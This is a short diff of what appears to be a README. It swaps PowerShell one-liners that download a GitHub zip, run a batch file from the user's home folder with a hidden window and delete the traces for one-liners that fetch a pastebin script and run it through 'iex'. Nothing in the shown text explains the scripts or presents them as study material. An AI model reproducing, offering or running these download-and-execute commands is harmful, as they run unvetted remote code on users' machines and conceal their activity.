@@ -34,12 +34,12 @@ powershell -c "& powershell -c (wget -useb -ur pastebin.com/raw/pqamKfgi).Conten
 <blockquote>
 	
 ```
-powershell -w hidden -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;}"&exit
+iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
 ```
 
 
 ```
-powershell -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;cls}"
+powershell iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
 ```
 	
 <details>
